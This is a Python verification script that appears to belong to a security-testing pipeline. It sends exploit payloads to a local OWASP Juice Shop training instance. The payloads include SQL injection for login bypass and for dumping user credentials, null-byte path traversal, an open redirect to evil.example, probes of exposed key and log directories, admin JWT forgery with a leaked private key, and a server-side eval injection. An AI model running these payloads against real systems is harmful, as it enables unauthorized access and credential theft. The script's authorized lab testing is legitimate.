#!/usr/bin/env python3
"""
Layer-3 (agentic verification / DAST bridge).

Throws the triage-layer PoC payloads at a RUNNING Juice Shop (http://localhost:3000)
and records whether each finding actually reproduces. A dynamically reproduced finding
is promoted from 'triage-confirmed' to 'dynamically CONFIRMED' (confidence 1.0).

stdlib only. Writes data/verify_results.json.
Authorized target: local OWASP Juice Shop training instance.
"""
import json, os, urllib.request, urllib.parse, urllib.error, http.client, subprocess

BASE = os.environ.get("JUICE", "http://localhost:3000")
HERE = os.path.dirname(os.path.abspath(__file__))
NODE = "/home/kali/node22/bin/node"
FORGE = "/home/kali/forge.js"
JWT_MOD = "/home/kali/juice-shop-run/node_modules/jsonwebtoken"

def http(method, path, data=None, headers=None, follow=True):
    url = BASE + path
    h = dict(headers or {})
    body = None
    if data is not None:
        body = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    class _NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener() if follow else urllib.request.build_opener(_NoRedir)
    try:
        r = opener.open(req, timeout=12)
        try:
            data = r.read()
        except http.client.IncompleteRead as ic:
            data = ic.partial  # serveIndex sends a slightly-off Content-Length
        return r.status, data.decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as ex:
        return None, f"ERR:{ex}", {}

R = {}
def rec(fid, status, http_code, evidence, payload):
    R[fid] = dict(status=status, http=http_code, evidence=evidence, payload=payload)
    print(f"  {fid}: {status}  (HTTP {http_code}) — {evidence}")

print(f"[*] target {BASE}")

# F032 — login SQLi (auth bypass)
p = {"email": "' OR 1=1--", "password": "x"}
st, body, _ = http("POST", "/rest/user/login", p)
admin_token = ""
try:
    _auth = json.loads(body).get("authentication", {})
    umail = _auth.get("umail", ""); admin_token = _auth.get("token", "")
except Exception: umail = ""
ok = st == 200 and '"token"' in body
rec("F032", "CONFIRMED" if ok else "NOT_CONFIRMED", st,
    f"인증 우회 성공 — {umail or '?'} 토큰 발급" if ok else "no token returned",
    "POST /rest/user/login {\"email\":\"' OR 1=1--\"}")

# F035 — search SQLi (union → credential exfiltration)
pl = "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"
st, body, _ = http("GET", "/rest/products/search?q=" + urllib.parse.quote(pl))
emails = body.count("@") if st == 200 else 0
ok = st == 200 and "@" in body and ("juice-sh.op" in body or emails >= 1)
rec("F035", "CONFIRMED" if ok else "NOT_CONFIRMED", st,
    f"union 주입으로 Users 테이블에서 {emails}개 이메일 행 탈취" if ok else "no data exfiltrated",
    "GET /rest/products/search?q=... UNION SELECT ... FROM Users--")

# F029 — path traversal via poison null byte
hit = None
for fn in ["package.json.bak%2500.md", "eastere.gg%2500.md", "coupons_2013.md.bak%2500.md"]:
    st, body, _ = http("GET", "/ftp/" + fn)
    if st == 200 and len(body) > 40 and "Only" not in body[:60]:
        hit = (fn, st, len(body)); break
rec("F029", "CONFIRMED" if hit else "NOT_CONFIRMED", hit[1] if hit else st,
    f"null-byte 우회로 /ftp/{hit[0]} 획득 ({hit[2]} bytes)" if hit else "bypass blocked",
    "GET /ftp/package.json.bak%2500.md")

# F034 — open redirect (allow-list substring bypass)
tgt = "https://evil.example/?x=https://github.com/juice-shop/juice-shop"
st, body, hdrs = http("GET", "/redirect?to=" + urllib.parse.quote(tgt), follow=False)
loc = hdrs.get("Location", "")
ok = st in (301, 302) and "evil.example" in loc
rec("F034", "CONFIRMED" if ok else "NOT_CONFIRMED", st,
    f"공격자 URL로 302 리다이렉트: {loc}" if ok else f"redirect not honored (Location={loc or '-'})",
    "GET /redirect?to=https://evil.example/?x=<allowlisted>")

# F038 / F040 / F041 — directory listing / info disclosure
# serveIndex emits a slightly-off Content-Length that trips urllib strict reads; use curl (lenient).
import subprocess
def curl_get(path):
    try:
        out = subprocess.run(["curl", "-s", "-m", "8", "-w", "\n%{http_code}", BASE + path],
                             capture_output=True, text=True, timeout=12).stdout
        body, _, code = out.rpartition("\n")
        return (int(code) if code.isdigit() else None), body
    except Exception as ex:
        return None, f"ERR:{ex}"
for fid, path in [("F038", "/ftp/"), ("F040", "/encryptionkeys/"), ("F041", "/support/logs/")]:
    st, body = curl_get(path)
    files = body.count('href="')
    ok = st == 200 and ("listing directory" in body or files >= 1)
    rec(fid, "CONFIRMED" if ok else "NOT_CONFIRMED", st,
        f"{path} 디렉터리 리스팅 노출 ({files}개 항목)" if ok else "no listing",
        f"GET {path}")

# F028 — JWT forgery with the in-repo RSA private key
try:
    payload = json.dumps({"status": "success", "data": {"id": 1, "email": "admin@juice-sh.op", "role": "admin"}})
    forged = subprocess.run([NODE, FORGE, payload, JWT_MOD], capture_output=True, text=True, timeout=20).stdout.strip()
    fst, _, _ = http("GET", "/api/Users", headers={"Authorization": "Bearer " + forged})
    gst, _, _ = http("GET", "/api/Users", headers={"Authorization": "Bearer x.y.z"})
    ok28 = fst == 200 and gst == 401
    rec("F028", "CONFIRMED" if ok28 else "NOT_CONFIRMED", fst,
        f"위조 RS256 토큰 수락(HTTP {fst}, 전체 사용자 목록 반환), 쓰레기 토큰은 {gst} — 커밋된 개인키로 완전 인증 우회" if ok28
        else f"forged token not accepted (forged={fst}, garbage={gst})",
        "sign JWT with in-repo RSA key → GET /api/Users (Authorization: Bearer <forged>)")
except Exception as ex:
    rec("F028", "ERROR", None, f"forge failed: {ex}", "node forge.js")

# F036 — eval/SSTI via profile username (arithmetic proof: #{99999*7} = 699993)
try:
    ck = {"Cookie": "token=" + admin_token}
    req = urllib.request.Request(BASE + "/profile",
        data=urllib.parse.urlencode({"username": "#{99999*7}"}).encode(),
        headers={**ck, "Content-Type": "application/x-www-form-urlencoded"}, method="POST")
    try: urllib.request.urlopen(req, timeout=12)
    except urllib.error.HTTPError: pass
    gst, gbody, _ = http("GET", "/profile", headers=ck)
    ok36 = "699993" in gbody
    rec("F036", "CONFIRMED" if ok36 else "NOT_CONFIRMED", gst,
        "eval이 공격자 표현식 실행 — 프로필에 #{99999*7} 결과 699993 렌더링" if ok36
        else "payload not evaluated",
        "POST /profile username=#{99999*7} → GET /profile (server-side eval)")
except Exception as ex:
    rec("F036", "ERROR", None, f"flow failed: {ex}", "profile eval SSTI")

json.dump(R, open(os.path.join(HERE, "data", "verify_results.json"), "w"), indent=2, ensure_ascii=False)
conf = sum(1 for v in R.values() if v["status"] == "CONFIRMED")
print(f"[*] {conf}/{len(R)} dynamically CONFIRMED -> data/verify_results.json")
